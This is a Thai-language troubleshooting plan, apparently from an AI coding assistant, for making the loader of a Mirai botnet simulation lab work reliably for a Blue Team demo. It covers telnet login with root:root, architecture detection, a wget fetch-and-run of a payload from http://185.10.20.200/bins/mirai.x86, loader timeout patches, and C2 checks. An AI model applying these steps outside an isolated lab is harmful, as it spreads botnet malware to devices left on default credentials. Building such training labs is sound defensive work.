# สิ่งที่ต้องแก้ — Mirai Botnet Simulation Lab (loader)

Dump จากแผนก่อนลงมือแก้โค้ด  
ลำดับความสำคัญ: **HTTP ค้าง → ลด/ข้าม dump ELF → ทำความสะอาดก่อนยิงซ้ำ → เช็ค CNC**

เกณฑ์ว่า “ผ่าน”:

```
Found writeable directory: /run/
Detected architecture: 'x86'
Upload method is wget
745k 100%
Succesfully ran payload
OK|<IP>:23 root:root x86
```

แล้วบนบอทมี process ค้าง และ C2 ขึ้นจำนวน

---

## ต้องแก้ (ไม่แก้แล้วเดโมพังง่าย)

### 1. เปิด HTTP ค้างไว้ตอนยิง loader

- รันที่ `/opt/http-server`
- `python3 -m http.server 80`
- ต้องมี `bins/mirai.x86` และ URL ตรงกับที่ loader ยิง:
  - `http://185.10.20.200:80/bins/mirai.x86`

นี่ไม่ใช่ patch ใน `connection.c` แต่เป็นเงื่อนไขให้ `OK|` ออก

### 2. อย่าพึ่ง `./loader.dbg` อย่างเดียว

- loader ไม่เสิร์ฟไฟล์
- ต้องมีเว็บแยก (ข้อ 1)

### 3. ขั้น detect arch ไม่เสถียร — **code ใน loader/**

ไฟล์: `loader/src/server.c` (state `TELNET_DETECT_ARCH`)

ตอนนี้ยิง:

```c
/bin/busybox cat /bin/echo
```

บน Alpine/LXC `/bin/echo` คือ busybox ทั้งก้อน dump ผ่าน telnet ทำให้ timeout / parser เพี้ยนเป็นบางรอบ และ log เต็มไปด้วยขยะ ELF

แก้เลือกอย่างใดอย่างหนึ่ง:

| ทางเลือก | ทำอะไร | ข้อดี | ข้อเสีย |
|---|---|---|---|
| **A (แนะนำ)** | เปลี่ยนเป็น `head -c 32 /bin/echo` (หรือ `/bin/busybox head -c 32 /bin/echo`) | ยัง detect ได้ ลด dump | ต้องมี `head` |
| **B** | ข้าม dump ทั้งขั้น ถ้า lab รู้แล้วว่าเป็น x86 — hardcode `conn->info.arch = "x86"` หรือส่ง `arch` มาใน stdin (`ip:port user:pass x86`) | นิ่งที่สุดสำหรับเดโม | ไม่ generic |

แนวที่ใช้: **A เป็นค่าเริ่ม** แล้วมีทางลัด B ถ้ายังไม่เสถียร

`connection_consume_arch()` ไม่ต้องเขียน parser ใหม่ — มันรอแค่ header `ELF` อยู่แล้ว แค่ลดขนาดที่ส่งเข้ามา

### 4. timeout ของขั้น dump/upload — **code ใน loader/**

Alpine/LXC ช้า อย่าใช้ timeout สั้น  
ขั้น mounts, detect arch, wget ควรยาวประมาณ **120 วินาที**

หลายขั้นถูกดึงเป็น 120 แล้ว (mounts / writeable / copy / detect / wget / tftp)

ที่ยังสั้นใน `loader/src/server.c`:

- หลัง detect arch เสร็จ ถูกเซ็ตกลับเป็น **15s** ก่อน probe wget/tftp
- `TELNET_RUN_BINARY` ยัง **30s** (Alpine ช้าตอนรัน payload ได้)
- `TELNET_CLEANUP` ยัง **10s**
- ค่าเริ่มต้น `connection_open` ยัง **10s** (`loader/src/connection.c`)

แผน: ขั้น dump / upload / run ให้ยาวประมาณ 120s ไม่แตะ login ถ้าไม่จำเป็น

### 5. ทำความสะอาดบอทก่อนยิงรอบใหม่

ถ้าติดแล้ว process ชื่อสุ่มจะรันค้าง รอบถัดไปได้บ้างไม่ได้บ้าง  
ฆ่า process เก่า ลบ `/run/dvrHelper` ก่อนเทสซ้ำ

ไม่งั้น `ps` ไปฆ่า process ตัวเอง / ชนไฟล์เดิม

### 6. อย่าเปิด telnet/ssh ซ้อนตอนรัน loader

session ชนกันแล้ว parser พังง่าย  
ดูเหมือน login ผิด ทั้งที่ `root:root` ถูก

---

## ควรแก้ (ให้เดโมนิ่งและดูครบ)

### 1. ใส่ wget ใน image บอทตั้งแต่ต้น

ตอนนี้มีแล้ว แต่ template ใหม่ต้องมี `apk add wget`

### 2. เช็คหลังได้ `OK|` ว่าต่อ CNC ได้จริง

- `OK|` = ติดและรันแล้ว
- botcount เพิ่มเมื่อ binary ชี้ CNC ถูก และ route ถึง
- ถ้า `OK|` แล้ว count ไม่ขึ้น ให้ไล่ CNC IP + pfSense ไม่ใช่ไล่ loader ต่อ

### 3. route / pfSense

บอทต้องออกไปหา HTTP:80 และ CNC ได้  
ตอน Blue Team block วง C2 ต้องตัดได้จริง

### 4. อย่าไล่ `/proc/mounts` ทั้งเครื่อง

คงชุด path หลักไว้: `/run` `/tmp` `/var/tmp` `/dev/shm` `/`  
**อันนี้แก้ไปแล้วใน `connection_consume_mounts()` — อย่าย้อนกลับ**

### 5. log เพี้ยนไม่ต้องไล่แก้เป็น bug หลัก

มันมาจาก dump ELF ผ่าน telnet  
ดูเฉพาะ `[FD6]`, `OK|`, `ERR|`  
จะหายเองถ้าแก้ข้อ 3 (ลด/ข้าม dump ELF)

### 6. ลำดับเดโม

1. ยิงทีละเครื่อง
2. รอ `OK|`
3. ค่อยโชว์ dashboard / Wireshark / ปุ่ม Attack

---

## สิ่งที่ไม่ต้องแก้

- `ECCHI: applet not found` = token ปกติ
- `Failed to bind to core 0` = warning LXC
- รหัสผ่าน `root:root` รอบที่พังไม่ใช่เพราะ login ผิด
- ภาษาใน terminal เอ๋อตอน dump binary ไม่ได้แปลว่าติดไม่สำเร็จ
- ใส่ `wget` ใน image / route pfSense / ลำดับเดโม — เป็น lab ops ไม่ใช่ patch loader รอบแรก

---

## งาน code ที่จะลงมือ (พอสั่งให้เริ่ม)

อยู่ใน `loader/` เท่านั้น:

1. ลด/ข้าม dump ELF (`head -c 32` หรือ hardcode x86)
2. ดึง timeout ที่ยังเหลือ 15/30 ให้ยาวสำหรับขั้น dump/upload/run
3. rebuild `loader.dbg`
4. HTTP + cleanup + ไม่ซ้อน session ยังเป็นขั้นตอนเดโม ไม่ได้ฝังในโค้ด

อย่าย้อน `/proc/mounts` ที่แก้แล้ว
